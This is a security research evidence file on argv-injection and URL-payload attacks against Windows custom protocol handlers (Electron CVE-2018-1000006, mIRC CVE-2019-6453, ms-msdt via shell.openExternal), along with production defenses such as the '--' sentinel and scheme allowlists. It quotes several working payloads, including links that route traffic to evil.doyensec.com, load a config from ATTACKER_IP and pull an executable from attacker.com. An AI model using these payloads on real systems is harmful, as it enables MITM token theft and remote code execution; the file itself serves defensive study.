# Evidence: D3 — Security: URL Payload Validation

**Dimension:** D3 (P0 Deep) — Security: attacks, CVE history, validation patterns
**Date:** 2026-04-17
**Sources:** Electron security blog, Doyensec research, Shabarkin research, Microsoft Learn, CVE details

---

## Key files / pages referenced

- https://www.electronjs.org/blog/protocol-handler-fix — CVE-2018-1000006 official fix post
- https://blog.doyensec.com/2018/05/24/electron-win-protocol-handler-bug-bypass.html — CVE-2018-1000006 bypass (the `host-rules` escape)
- https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8 — 1-click RCE via shell.openExternal → protocol argv injection
- https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85) — Microsoft's own security-issues section
- https://proofofcalc.com/cve-2019-6453-mIRC/ — CVE-2019-6453 (generalizable pattern, mIRC case study)

---

## Findings

### Finding: CVE-2018-1000006 — argv injection via URL in any Windows Electron app that registered a custom protocol
**Confidence:** CONFIRMED
**Evidence:** https://www.electronjs.org/blog/protocol-handler-fix

Scope (per Electron's official blog):
> "Electron apps designed to run on Windows that register themselves as the default handler for a protocol, like `myapp://`, are vulnerable."
> "Applications were susceptible regardless of registration method—whether through native code, Windows registry, or Electron's `app.setAsDefaultProtocolClient` API."

Affected: Windows only. macOS and Linux were explicitly stated as not vulnerable (the argv flow on those platforms is structured differently).

Known affected apps publicly reported at the time: Slack, Skype, Signal, GitHub Desktop, Twitch, WordPress.com desktop — any Electron app that registered a protocol with a default `setAsDefaultProtocolClient` call.

Fixed versions: Electron 1.6.17, 1.7.12, 1.8.2-beta.5 (Jan 2018).

The attack payload (from Doyensec):
```
myapp://foobar" --gpu-launcher="cmd c/ start calc" --foobar='
```

Electron's fix: `command_line_args.cc` added a blacklist of known-dangerous Chromium/Node flags, checked via binary search.

### Finding: The initial blacklist fix was bypassed via `host-rules` (MITM) and case-sensitivity
**Confidence:** CONFIRMED
**Evidence:** https://blog.doyensec.com/2018/05/24/electron-win-protocol-handler-bug-bypass.html

Doyensec demonstrated the blacklist was incomplete. `host-rules` was missing — a Chromium flag that rewrites DNS to an attacker's IP:

```html
<script>
 window.location = 'skype://user?userinfo" --host-rules="MAP * evil.doyensec.com" --foobar='
</script>
```

Effect: all Chromium network traffic inside the Electron app routes through attacker infrastructure (MITM), enabling OAuth token theft and, if `nodeIntegration` is enabled, full RCE via injected HTML + Node APIs.

Secondary bypass: uppercase variants (`--GPU-launcher`) initially evaded the case-sensitive blacklist check.

Fixed: Electron 1.7.15, 1.8.7, 2.0.1 (May 2018).

Recommended defense regardless of Electron version — **the `--` sentinel pattern**:
```javascript
app.setAsDefaultProtocolClient(protocol, process.execPath, [
  '--your-switches-here',
  '--',
])
```

The double-dash tells Chromium that everything after it is a positional parameter, not a flag — defeats argv injection structurally rather than relying on a blacklist.

### Finding: VS Code applies the `--` sentinel pattern in its production code
**Confidence:** CONFIRMED
**Evidence:** `microsoft/vscode/src/vs/platform/url/electron-main/electronUrlListener.ts`

```typescript
const windowsParameters = environmentMainService.isBuilt ? [] : [`"${environmentMainService.appRoot}"`];
windowsParameters.push('--open-url', '--');
app.setAsDefaultProtocolClient(productService.urlProtocol, process.execPath, windowsParameters);
```

The trailing `'--'` is the CVE-2018-1000006 mitigation. VS Code additionally prefixes `--open-url` as a sentinel flag that identifies URLs delivered via the protocol handler (disambiguates from other CLI invocations).

### Finding: CVE-2019-6453 (mIRC) generalizes the class — any registered protocol handler is vulnerable if it accepts flag-like args
**Confidence:** CONFIRMED
**Evidence:** https://proofofcalc.com/cve-2019-6453-mIRC/

mIRC registered `irc://` / `ircs://` / `mircurl://` schemes. Windows invoked mIRC with `"C:\Program Files (x86)\mIRC\mirc.exe" %1`. A link like `irc://? -i\\ATTACKER_IP\share\mirc.ini` caused mIRC to load a remote config file from a UNC path (which mIRC's `-i` flag accepts). The remote config contained `on *:START: { /run calc.exe }`.

Browser-dependent behavior:
> "Firefox and Edge pass unencoded URIs; Chrome encodes them, blocking this attack"

This means the same crafted link can be exploitable from one browser and benign from another — apps cannot rely on "URLs are always percent-encoded."

Microsoft's own URI registration documentation warns about this precise issue:
> "When ShellExecute executes the pluggable protocol handler with a string on the command line, any non-encoded spaces, quotes, and backslashes in the URI will be interpreted as part of the command line. This means that if you use C/C++'s argc and argv to determine the arguments passed to your application, the string may be broken across multiple parameters."

Mitigations (per Microsoft):
- Quote `%1` in the registry ("%1" as written)
- Assume "any parameters on the command line could come from malicious parties, and carefully validate them"
- "Avoid spaces, quotes, or backslashes in your URI"

### Finding: The adjacent attack — `shell.openExternal()` on untrusted URLs — uses the same primitive via OS native protocols
**Confidence:** CONFIRMED
**Evidence:** https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8

Even if an app is itself safe, `shell.openExternal(untrusted_url)` invokes the OS default handler for the URL's scheme. If the scheme is `ms-msdt:`, `search-ms:`, `ms-officecmd:` (all native Windows schemes with known argv-injection flaws), the attack chains through a different app.

Example payload:
```
ms-msdt:-id PCWDiagnostic /moreoptions false /skip true /param
IT_BrowseForFile="\\attacker.com\smb_share\malicious_executable.exe"
```

Defense (per Shabarkin):
> "limiting the URI schema to https://, http://, and mailto: only. If any other URI schema is required by application business logic, it should be additionally reviewed"

This is not directly a deep-link-registration concern — it concerns Electron's outbound navigation — but it's part of the same attack class (URL argv → OS → process launch) that app developers must understand. An app that (1) registers its own scheme AND (2) uses `shell.openExternal` is exposed on both sides.

### Finding: There are no publicly-known 2023+ CVEs specifically on `app.setAsDefaultProtocolClient` argv injection (the `--` sentinel closed the class)
**Confidence:** INFERRED
**Evidence:** Searches of CVE databases and advisories for 2022-2026

Searches for "electron setAsDefaultProtocolClient 2023 2024 CVE" surface mostly:
- CVE-2018-1000006 (closed by `--` pattern)
- CVE-2019-6453 (mIRC — not Electron)
- Recent openExternal + XSS → openExternal abuse chains (DeepChat, 2025; this is a different attack class — XSS-to-RCE via outbound shell.openExternal, not inbound URL handler)

The `--` sentinel combined with Electron's ongoing blacklist updates appears to have closed the inbound argv-injection class. Remaining Electron protocol CVEs concentrate on outbound `shell.openExternal` and XSS chains.

### Finding: URL-payload validation patterns seen in production
**Confidence:** CONFIRMED (partial; pattern catalog)
**Evidence:** VS Code source (uri parsing), Cursor docs (JWT), Obsidian docs (parameter allowlists), Windows tutorial (general guidance)

Observed validation patterns in production apps:

1. **Parse with platform-safe URL parser, reject on failure.**
   VS Code `electronUrlListener.ts`:
   ```typescript
   private uriFromRawUrl(url: string): URI | undefined {
       try { return URI.parse(url); } catch (e) { return undefined; }
   }
   ```
   Unparseable URIs are dropped silently; no partial processing.

2. **Scheme allowlist — the app processes ONLY its registered scheme.**
   VS Code checks `uri.scheme === productService.urlProtocol` via the URL service's handler dispatch; non-matching schemes are ignored.

3. **Parameter allowlists / signed payloads.**
   Cursor uses JWT to sign deep-link payloads (per the cursor-deeplink wiki):
   > "The cursor-deeplink system uses JSON Web Tokens (JWT) for authenticating and validating URI requests."
   Obsidian's URI spec defines a fixed set of actions (`open-note`, `new`, `search`, `daily`, `hook-get-address`) with typed parameters; unknown actions are rejected.

4. **Path-traversal scrubbing before filesystem access.**
   Any URL parameter that names a file/path (e.g. `?doc=guides/auth.md`) must be resolved to an absolute path and checked against an allowed root. This is 1P hygiene, not documented in Electron itself, but is the standard defense against `openknowledge://open?doc=../../etc/passwd`-style attacks.

5. **User confirmation UX for destructive actions.**
   Microsoft's own guidance: "Applications that could initiate dangerous actions based on external data must first confirm those actions with the user."

### Finding: Windows browser percent-decoding inconsistency is a validation pitfall
**Confidence:** CONFIRMED
**Evidence:** https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85)

Microsoft documents:
> "Because Internet Explorer will decode all percent-encoded octets in the URI before passing the resulting string to ShellExecute, URIs such as `alert:%3F?` will be given to the alert application pluggable protocol handler as `alert:??`. The handler won't know that the first question mark was percent-encoded. To avoid this issue, pluggable protocol handlers and their associated URI scheme must not rely on encoding."

Different browsers have different decode behavior (Chrome encodes, Firefox/Edge do not). Apps must not rely on knowing whether the received URL is encoded or decoded.

---

## Negative searches

- Searched for CVEs in 2023-2026 on `app.setAsDefaultProtocolClient` with argv injection — only CVE-2018-1000006 (closed) came up. The class appears to be mitigated at the Electron framework level via the `--` sentinel + updated blacklist.
- Searched for macOS-specific deep-link argv injection CVE — none found; macOS's `open-url` event delivers URLs as a structured string argument rather than via argv parsing, closing this attack surface by construction.

## Gaps / follow-ups

- Whether current Electron (37+) still enforces the blacklist inside `command_line_args.cc` or whether it has been removed in favor of relying on the `--` sentinel alone. (Defense-in-depth question.)
- Concrete payload length limits — Microsoft guidance mentions "overly long URIs" but doesn't specify; Windows shell command-line limit is ~32,767 chars historically.
